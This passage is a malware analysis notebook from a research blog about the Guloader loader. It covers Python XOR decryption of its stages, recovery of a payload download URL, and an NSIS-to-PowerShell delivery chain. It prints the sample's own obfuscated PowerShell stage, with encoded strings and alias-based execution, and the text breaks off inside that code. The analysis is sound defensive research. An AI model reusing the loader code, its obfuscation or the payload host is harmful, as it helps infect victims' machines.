<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Guloader | OALABS Research</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="Guloader" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A closer look at this infamous loader" />
<meta property="og:description" content="A closer look at this infamous loader" />
<link rel="canonical" href="https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html" />
<meta property="og:url" content="https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html" />
<meta property="og:site_name" content="OALABS Research" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-12-16T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Guloader" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-16T00:00:00-06:00","datePublished":"2022-12-16T00:00:00-06:00","description":"A closer look at this infamous loader","headline":"Guloader","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html"},"url":"https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />

<script>
function wrap_img(fn) {
    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
        var elements = document.querySelectorAll(".post img");
        Array.prototype.forEach.call(elements, function(el, i) {
            if (el.getAttribute("title") && (el.className != "emoji")) {
                const caption = document.createElement('figcaption');
                var node = document.createTextNode(el.getAttribute("title"));
                caption.appendChild(node);
                const wrapper = document.createElement('figure');
                wrapper.className = 'image';
                el.parentNode.insertBefore(wrapper, el);
                el.parentNode.removeChild(el);
                wrapper.appendChild(el);
                wrapper.appendChild(caption);
            }
        });
    } else { document.addEventListener('DOMContentLoaded', fn); }
}
window.onload = wrap_img;
</script>

<script>
    document.addEventListener("DOMContentLoaded", function(){
    // add link icon to anchor tags
    var elem = document.querySelectorAll(".anchor-link")
    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
    });
</script>
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/categories/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Guloader</h1><p class="page-description">A closer look at this infamous loader</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-12-16T00:00:00-06:00" itemprop="datePublished">
        Dec 16, 2022
      </time>
       • <span class="read-time" title="Estimated read time">
    
    
      22 min read
    
</span></p>

    
      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
      
        <a class="category-tags-link" href="/categories/#guloader">guloader</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#unicorn">unicorn</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#emulation">emulation</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#anti-debug">anti-debug</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#debugging">debugging</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#config">config</a>
        
      
      </p>
    

    
      
        <div class="pb-5 d-flex flex-justify-left">
            <div class="px-2">
                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
                </a>
            </div>
            <div class="px-2">
                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
                </a>
            </div>
          <div class="px-2">

    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2022-12-16-guloader.ipynb" role="button" target="_blank">
<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
    </a>
</div>

          
          
          
        </div>
      </header>

  <div class="post-content e-content" itemprop="articleBody">
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#Overview">Overview </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Sample">Sample </a></li>
<li class="toc-entry toc-h3"><a href="#References">References </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Stage-1">Stage 1 </a></li>
<li class="toc-entry toc-h3"><a href="#Stage-2">Stage 2 </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Guloader-Deliver-(PowerShell)">Guloader Deliver (PowerShell) </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Sample">Sample </a></li>
<li class="toc-entry toc-h3"><a href="#Overview">Overview </a></li>
<li class="toc-entry toc-h3"><a href="#Analysis">Analysis </a>
<ul>
<li class="toc-entry toc-h4"><a href="#Stage-1">Stage 1 </a></li>
<li class="toc-entry toc-h4"><a href="#Stage-2">Stage 2 </a></li>
<li class="toc-entry toc-h4"><a href="#Stage-3">Stage 3 </a></li>
<li class="toc-entry toc-h4"><a href="#Shellcode-Loader">Shellcode Loader </a></li>
<li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-1">Guloader Shellcode Stage 1 </a></li>
<li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-2">Guloader Shellcode Stage 2 </a></li>
<li class="toc-entry toc-h4"><a href="#VEH-Program-Flow-Redirection">VEH Program Flow Redirection </a></li>
<li class="toc-entry toc-h4"><a href="#String-Decryption">String Decryption </a></li>
<li class="toc-entry toc-h4"><a href="#New-and-Improved-Hook-(Only-for-INT)">New and Improved Hook (Only for INT) </a>
<ul>
<li class="toc-entry toc-h5"><a href="#Add-Code-To-Automatically-Handle-RET">Add Code To Automatically Handle RET </a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#Final-Automatic-String-Decryption">Final Automatic String Decryption </a></li>
<li class="toc-entry toc-h4"><a href="#IDA-Script-to-Find-Encrypted-String-Functions">IDA Script to Find Encrypted String Functions </a></li>
</ul>
</li>
</ul>
</li>
</ul><!--
#################################################
### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
#################################################
# file to edit: _notebooks/2022-12-16-guloader.ipynb
-->

<div class="container" id="notebook-container">
        
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h2>
<h3 id="Sample">
<a class="anchor" href="#Sample" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sample<a class="anchor-link" href="#Sample"> </a>
</h3>
<p><code>14d52119459ef12be3a2f9a3a6578ee3255580f679b1b54de0990b6ba403b0fe</code> <a href="https://malshare.com/sample.php?action=detail&amp;hash=14d52119459ef12be3a2f9a3a6578ee3255580f679b1b54de0990b6ba403b0fe">malshare</a></p>
<h3 id="References">
<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
</h3>
<ul>
<li><a href="https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/">Defeating Guloader Anti-Analysis Technique</a></li>
<li><a href="https://www.spamhaus.com/resource-center/dissecting-the-new-shellcode-based-variant-of-guloader-cloudeye/">Dissecting the new shellcode-based variant of GuLoader (CloudEyE)</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/spoofed-saudi-purchase-order-drops-guloader-part-two">Spoofed Saudi Purchase Order Drops GuLoader – Part 2</a></li>
<li><a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">Malware Analysis: GuLoader Dissection Reveals New Anti-Analysis Techniques and Code Injection Redundancy (published after our notes)</a></li>
<li><a href="https://github.com/alexander-hanel/unicorn-engine-noteshttps://github.com/alexander-hanel/unicorn-engine-notes">Alex Hanel Unicorn Notes</a></li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Analysis">
<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
</h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Stage-1">
<a class="anchor" href="#Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 1<a class="anchor-link" href="#Stage-1"> </a>
</h3>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">file_data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/stage1.bin'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="mh">0x919E1E2E</span><span class="p">)</span>
<span class="n">code_offset</span> <span class="o">=</span> <span class="mh">0x0000014E</span> 
<span class="n">enc_code</span> <span class="o">=</span> <span class="n">file_data</span><span class="p">[</span><span class="n">code_offset</span><span class="p">:]</span>



<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_code</span><span class="p">)):</span>
    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">enc_code</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>

<span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/stage2.bin'</span><span class="p">,</span><span class="s1">'wb'</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Stage-2">
<a class="anchor" href="#Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2<a class="anchor-link" href="#Stage-2"> </a>
</h3>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="nb">hex</span><span class="p">((</span><span class="mh">0x96900857</span> <span class="o">+</span> <span class="mh">0x10E451D0</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xAA6DFF89</span> <span class="o">^</span> <span class="mh">0xD19A097</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="nb">hex</span><span class="p">((</span><span class="mh">0x191AE730</span> <span class="o">^</span> <span class="mh">0x320EB5D5</span> <span class="o">^</span> <span class="mh">0xB8DB25E1</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x6C3088FC</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="nb">hex</span><span class="p">((</span><span class="mh">0xE22ECFA7</span> <span class="o">^</span> <span class="mh">0xD05F809C</span> <span class="o">^</span> <span class="mh">0x4E1C381C</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x7C6D76C6</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="p">(</span><span class="mh">0x1C90313A</span>  <span class="o">^</span> <span class="mh">0x0A3C51979</span> <span class="o">^</span> <span class="mh">0x8A519DBE</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3504B2FD</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">buff</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'D8 E3 A9 5E AB'</span><span class="p">)</span>
<span class="n">buff2</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'b697cd32c7143eea5fb5fd3fa3dba8aaebe6226c89b9501c20806c888f58a2ba8ebc6b0a94e5bded795a2757109b8997d87e8080ee4aeb'</span><span class="p">)</span>

<span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buff2</span><span class="p">)):</span>
    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">buff2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">buff</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">)])</span>
    
<span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

<span class="n">xor_crypt</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">buff2</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">egg</span> <span class="o">=</span> <span class="n">xor_crypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">'http'</span><span class="p">,</span> <span class="n">buff2</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">egg</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>

<span class="n">stage2_data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/stage2.bin'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">c2_offset</span> <span class="o">=</span> <span class="n">stage2_data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>

<span class="n">xor_crypt</span><span class="p">(</span><span class="n">stage2_data</span><span class="p">[</span><span class="n">c2_offset</span><span class="p">:</span><span class="n">c2_offset</span><span class="o">+</span><span class="mi">100</span><span class="p">],</span> <span class="n">buff2</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s1">'http://bounceclick.live/VVB/COrg_RYGGqN229.bin'</span><span class="p">))</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Guloader-Deliver-(PowerShell)">
<a class="anchor" href="#Guloader-Deliver-(PowerShell)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Deliver (PowerShell)<a class="anchor-link" href="#Guloader-Deliver-(PowerShell)"> </a>
</h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Sample">
<a class="anchor" href="#Sample" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sample<a class="anchor-link" href="#Sample"> </a>
</h3>
<p><code>54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae</code> <a href="https://malshare.com/sample.php?action=detail&amp;hash=54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae">malshare</a></p>
<h3 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h3>
<p>This sample also uses NSIS installer but instead of loading shellcode directly from the NSIS script they add an intermediate stage with PowerShell to further obfuscate the loader.</p>
<h3 id="Analysis">
<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
</h3>
<h4 id="Stage-1">
<a class="anchor" href="#Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 1<a class="anchor-link" href="#Stage-1"> </a>
</h4>
<p>Stage one is the NSIS script which is used to launch and obfuscated powershell script in the <code>Soothsaying.For</code> file. The script can be found on ghostbin <a href="https://www.klgrth.io/paste/h2vm4">here</a></p>
<h4 id="Stage-2">
<a class="anchor" href="#Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2<a class="anchor-link" href="#Stage-2"> </a>
</h4>
<p>The obfuscated powershell contains a 3rd stage obfuscated powershell command in a variable that is deobfuscated and launched. We circomvented this by replacing the <code>IEX</code> execute commands with <code>Write-Output</code> print statements.</p>
<h4 id="Stage-3">
<a class="anchor" href="#Stage-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 3<a class="anchor-link" href="#Stage-3"> </a>
</h4>
<p>The obfuscatd powershell 3rd stage contains multiple encrypted strings which we have decrypted below.</p>

</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">ps_data</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">Function HTB {        param([String]$Humanmummy152);</span>
<span class="s1">        $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2);</span>
<span class="s1">        For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){                </span>
<span class="s1">            $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16);</span>
<span class="s1">            $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141);</span>
<span class="s1">        }       [String][System.Text.Encoding]::ASCII.GetString($Sprjtende);</span>
<span class="s1">}$Fitchet0=HTB 'DEF4FEF9E8E0A3E9E1E1';</span>
<span class="s1">$Fitchet1=HTB 'C0E4EEFFE2FEE2EBF9A3DAE4E3BEBFA3D8E3FEECEBE8C3ECF9E4FBE8C0E8F9E5E2E9FE';</span>
<span class="s1">$Fitchet2=HTB 'CAE8F9DDFFE2EECCE9E9FFE8FEFE';</span>
<span class="s1">$Fitchet3=HTB 'DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EB';</span>
<span class="s1">$Fitchet4=HTB 'FEF9FFE4E3EA';</span>
<span class="s1">$Fitchet5=HTB 'CAE8F9C0E2E9F8E1E8C5ECE3E9E1E8';</span>
<span class="s1">$Fitchet6=HTB 'DFD9DEFDE8EEE4ECE1C3ECE0E8A1ADC5E4E9E8CFF4DEE4EAA1ADDDF8EFE1E4EE';</span>
<span class="s1">$Fitchet7=HTB 'DFF8E3F9E4E0E8A1ADC0ECE3ECEAE8E9';</span>
<span class="s1">$Fitchet8=HTB 'DFE8EBE1E8EEF9E8E9C9E8E1E8EAECF9E8';</span>
<span class="s1">$Fitchet9=HTB 'C4E3C0E8E0E2FFF4C0E2E9F8E1E8';</span>
<span class="s1">$udvalgsprocedure0=HTB 'C0F4C9E8E1E8EAECF9E8D9F4FDE8';</span>
<span class="s1">$udvalgsprocedure1=HTB 'CEE1ECFEFEA1ADDDF8EFE1E4EEA1ADDEE8ECE1E8E9A1ADCCE3FEE4CEE1ECFEFEA1ADCCF8F9E2CEE1ECFEFE';</span>
<span class="s1">$udvalgsprocedure2=HTB 'C4E3FBE2E6E8';</span>
<span class="s1">$udvalgsprocedure3=HTB 'DDF8EFE1E4EEA1ADC5E4E9E8CFF4DEE4EAA1ADC3E8FADEE1E2F9A1ADDBE4FFF9F8ECE1';</span>
<span class="s1">$udvalgsprocedure4=HTB 'DBE4FFF9F8ECE1CCE1E1E2EE';</span>
<span class="s1">$udvalgsprocedure5=HTB 'E3F9E9E1E1';</span>
<span class="s1">$udvalgsprocedure6=HTB 'C3F9DDFFE2F9E8EEF9DBE4FFF9F8ECE1C0E8E0E2FFF4';</span>
<span class="s1">$udvalgsprocedure7=HTB 'C4C8D5';</span>
<span class="s1">$udvalgsprocedure8=HTB 'D1';</span>
<span class="s1">Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7;</span>
<span class="s1">function fkp {Param ($Ries, $Negeringsfunktionens)     ;</span>
<span class="s1">$Kabar0 =HTB 'A9D8E3ECEFE9E4EEECF9E4FBE8ADB0ADA5D6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3CAE8F9CCFEFEE8E0EFE1E4E8FEA5A4ADF1ADDAE5E8FFE8A0C2EFE7E8EEF9ADF6ADA9D2A3CAE1E2EFECE1CCFEFEE8E0EFE1F4CEECEEE5E8ADA0CCE3E9ADA9D2A3C1E2EEECF9E4E2E3A3DEFDE1E4F9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B5A4D6A0BCD0A3C8FCF8ECE1FEA5A9CBE4F9EEE5E8F9BDA4ADF0A4A3CAE8F9D9F4FDE8A5A9CBE4F9EEE5E8F9BCA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar0;</span>
<span class="s1">$Kabar5 = HTB 'A9DEFDE4E9FEE5ECE0E0E8FFE8FEADB0ADA9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9BFA1ADD6D9F4FDE8D6D0D0ADCDA5A9CBE4F9EEE5E8F9BEA1ADA9CBE4F9EEE5E8F9B9A4A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar5;</span>
<span class="s1">$Kabar1 = HTB 'FFE8F9F8FFE3ADA9DEFDE4E9FEE5ECE0E0E8FFE8FEA3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5D6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBD0A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBA5A5C3E8FAA0C2EFE7E8EEF9ADC4E3F9DDF9FFA4A1ADA5A9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9B8A4A4A3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5A9DFE4E8FEA4A4A4A4A1ADA9C3E8EAE8FFE4E3EAFEEBF8E3E6F9E4E2E3E8E3FEA4A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar1;</span>
<span class="s1">}function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]);</span>
<span class="s1">$Kabar2 = HTB 'A9CFE2FFE3E8E2ADB0ADD6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3C9E8EBE4E3E8C9F4E3ECE0E4EECCFEFEE8E0EFE1F4A5A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CCFEFEE8E0EFE1F4C3ECE0E8A5A9CBE4F9EEE5E8F9B5A4A4A1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3C8E0E4F9A3CCFEFEE8E0EFE1F4CFF8E4E1E9E8FFCCEEEEE8FEFED0B7B7DFF8E3A4A3C9E8EBE4E3E8C9F4E3ECE0E4EEC0E2E9F8E1E8A5A9CBE4F9EEE5E8F9B4A1ADA9EBECE1FEE8A4A3C9E8EBE4E3E8D9F4FDE8A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BDA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BCA1ADD6DEF4FEF9E8E0A3C0F8E1F9E4EEECFEF9C9E8E1E8EAECF9E8D0A4';</span>
<span class="s1">udvalgsprocedure9 $Kabar2;</span>
<span class="s1">$Kabar3 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8CEE2E3FEF9FFF8EEF9E2FFA5A9CBE4F9EEE5E8F9BBA1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CEECE1E1E4E3EACEE2E3FBE8E3F9E4E2E3FED0B7B7DEF9ECE3E9ECFFE9A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';</span>
<span class="s1">udvalgsprocedure9 $Kabar3;</span>
